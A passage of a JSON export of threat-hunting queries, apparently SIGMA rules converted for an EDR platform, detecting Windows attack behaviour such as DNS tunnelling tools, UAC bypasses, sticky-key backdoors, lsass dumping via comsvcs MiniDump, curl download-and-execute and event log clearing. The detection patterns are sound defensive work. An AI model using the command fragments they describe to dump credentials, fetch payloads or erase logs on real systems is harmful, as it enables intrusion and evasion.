            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 282
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Well-known DNS Exfiltration tools execution",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1048",
                "t1071",
                "t1132"
            ],
            "name": "DNS Exfiltration and Tunneling Tools Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\iodine.exe\" or tgt.process.image.path contains \"\\dnscat2\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 283
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.cmdline contains \":\\Windows\\TEMP\\ScreenConnect\\\" and src.process.cmdline contains \"run.cmd\") and (tgt.process.image.path contains \"\\bitsadmin.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\curl.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\nltest.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\wevtutil.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 284
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the Installation of a Exchange Transport Agent",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1505"
            ],
            "name": "MSExchange Transport Agent Installation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.cmdline contains \"Install-TransportAgent\") | columns AssemblyPath",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 285
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using Windows Media Player - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path=\"C:\\Program Files\\Windows Media Player\\osk.exe\" or (tgt.process.image.path=\"C:\\Windows\\System32\\cmd.exe\" and src.process.cmdline=\"\\\"C:\\Windows\\system32\\mmc.exe\\\" \\\"C:\\Windows\\system32\\eventvwr.msc\\\" /s\")) and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 286
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of \"msdt.exe\" using an answer file which is simulating the legitimate way of calling msdt via \"pcwrun.exe\" (For example from the compatibility tab)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Execute MSDT Via Answer File",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\msdt.exe\" and tgt.process.cmdline contains \"\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml\") and (tgt.process.cmdline contains \" -af \" or tgt.process.cmdline contains \" /af \")) and (not src.process.image.path contains \"\\pcwrun.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 287
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects child processes of Microsoft.NodejsTools.PressAnyKey.exe that can be used to execute any other binary",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Visual Studio NodejsTools PressAnyKey Arbitrary Binary Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\Microsoft.NodejsTools.PressAnyKey.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 288
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using DismHost DLL hijacking (UACMe 63)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using DismHost",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"C:\\Users\\\" and src.process.image.path contains \"\\AppData\\Local\\Temp\\\" and src.process.image.path contains \"\\DismHost.exe\") and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 289
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the registration of a debugger for a program that is available in the logon screen (sticky key backdoor).",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1546"
            ],
            "name": "Suspicious Debugger Registration Cmdline",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\CurrentVersion\\Image File Execution Options\\\" and (tgt.process.cmdline contains \"sethc.exe\" or tgt.process.cmdline contains \"utilman.exe\" or tgt.process.cmdline contains \"osk.exe\" or tgt.process.cmdline contains \"magnify.exe\" or tgt.process.cmdline contains \"narrator.exe\" or tgt.process.cmdline contains \"displayswitch.exe\" or tgt.process.cmdline contains \"atbroker.exe\" or tgt.process.cmdline contains \"HelpPane.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 290
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects port forwarding activity via SSH.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1572",
                "t1021",
                "t1021"
            ],
            "name": "Port Forwarding Activity Via SSH.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\ssh.exe\" and (tgt.process.cmdline contains \" -R \" or tgt.process.cmdline contains \" /R \" or tgt.process.cmdline contains \" \u2013R \" or tgt.process.cmdline contains \" \u2014R \" or tgt.process.cmdline contains \" \u2015R \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 291
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a process spawned by the terminal service server process (this could be an indicator for an exploitation of CVE-2019-0708)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1190",
                "t1210"
            ],
            "name": "Terminal Service Process Spawn",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.cmdline contains \"\\svchost.exe\" and src.process.cmdline contains \"termsvcs\") and (not ((tgt.process.image.path contains \"\\rdpclip.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\csrss.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\wininit.exe\" or tgt.process.image.path contains \":\\Windows\\System32\\winlogon.exe\") or not (tgt.process.image.path matches \"\\.*\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 292
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious execution of \"PDQDeployRunner\" which is part of the PDQDeploy service stack that is responsible for executing commands and packages on a remote machines",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Potentially Suspicious Execution Of PDQDeployRunner",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\PDQDeployRunner-\" and ((tgt.process.image.path contains \"\\bash.exe\" or tgt.process.image.path contains \"\\certutil.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\csc.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\dllhost.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\msiexec.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\scriptrunner.exe\" or tgt.process.image.path contains \"\\wmic.exe\" or tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\wsl.exe\") or (tgt.process.image.path contains \":\\ProgramData\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \":\\Windows\\TEMP\\\" or tgt.process.image.path contains \"\\AppData\\Local\\Temp\") or (tgt.process.cmdline contains \" -decode \" or tgt.process.cmdline contains \" -enc \" or tgt.process.cmdline contains \" -encodedcommand \" or tgt.process.cmdline contains \" -w hidden\" or tgt.process.cmdline contains \"DownloadString\" or tgt.process.cmdline contains \"FromBase64String\" or tgt.process.cmdline contains \"http\" or tgt.process.cmdline contains \"iex \" or tgt.process.cmdline contains \"Invoke-\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 293
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious process patterns found in logs when CrackMapExec is used",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "HackTool - CrackMapExec Process Patterns",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.cmdline contains \"tasklist /fi \" and tgt.process.cmdline contains \"Imagename eq lsass.exe\") and (tgt.process.cmdline contains \"cmd.exe /c \" or tgt.process.cmdline contains \"cmd.exe /r \" or tgt.process.cmdline contains \"cmd.exe /k \" or tgt.process.cmdline contains \"cmd /c \" or tgt.process.cmdline contains \"cmd /r \" or tgt.process.cmdline contains \"cmd /k \") and (tgt.process.user contains \"AUTHORI\" or tgt.process.user contains \"AUTORI\")) or (tgt.process.cmdline contains \"do rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump\" and tgt.process.cmdline contains \"\\Windows\\Temp\\\" and tgt.process.cmdline contains \" full\" and tgt.process.cmdline contains \"%%B\") or (tgt.process.cmdline contains \"tasklist /v /fo csv\" and tgt.process.cmdline contains \"findstr /i \\\"lsass\\\"\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 294
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "ForceV1 asks for information directly from the kernel space. Conhost connects to the console application. High IntegrityLevel means the process is running with elevated privileges, such as an Administrator context.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Suspicious High IntegrityLevel Conhost Legacy Option",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"High\",\"S-1-16-12288\")) and (tgt.process.cmdline contains \"conhost.exe\" and tgt.process.cmdline contains \"0xffffffff\" and tgt.process.cmdline contains \"-ForceV1\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 295
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218",
                "t1105"
            ],
            "name": "Curl Download And Execute Combination",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \" -c \" or tgt.process.cmdline contains \" /c \" or tgt.process.cmdline contains \" \u2013c \" or tgt.process.cmdline contains \" \u2014c \" or tgt.process.cmdline contains \" \u2015c \") and (tgt.process.cmdline contains \"curl \" and tgt.process.cmdline contains \"http\" and tgt.process.cmdline contains \"-o\" and tgt.process.cmdline contains \"&\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 296
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the clearing or configuration tampering of EventLog using utilities such as \"wevtutil\", \"powershell\" and \"wmic\".\nThis technique were seen used by threat actors and ransomware strains in order to evade defenses.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1070",
                "t1562"
            ],
            "name": "Suspicious Eventlog Clearing or Configuration Change Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\wevtutil.exe\" and (tgt.process.cmdline contains \"clear-log \" or tgt.process.cmdline contains \" cl \" or tgt.process.cmdline contains \"set-log \" or tgt.process.cmdline contains \" sl \" or tgt.process.cmdline contains \"lfn:\")) or ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \"Clear-EventLog \" or tgt.process.cmdline contains \"Remove-EventLog \" or tgt.process.cmdline contains \"Limit-EventLog \" or tgt.process.cmdline contains \"Clear-WinEvent \")) or ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wmic.exe\") and tgt.process.cmdline contains \"ClearEventLog\")) and (not ((src.process.image.path in (\"C:\\Windows\\SysWOW64\\msiexec.exe\",\"C:\\Windows\\System32\\msiexec.exe\")) and tgt.process.cmdline contains \" sl \"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 297
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects WMIC executing \"process call create\" with suspicious calls to processes such as \"rundll32\", \"regsrv32\", etc.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1047"
            ],
            "name": "Suspicious Process Created Via Wmic.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
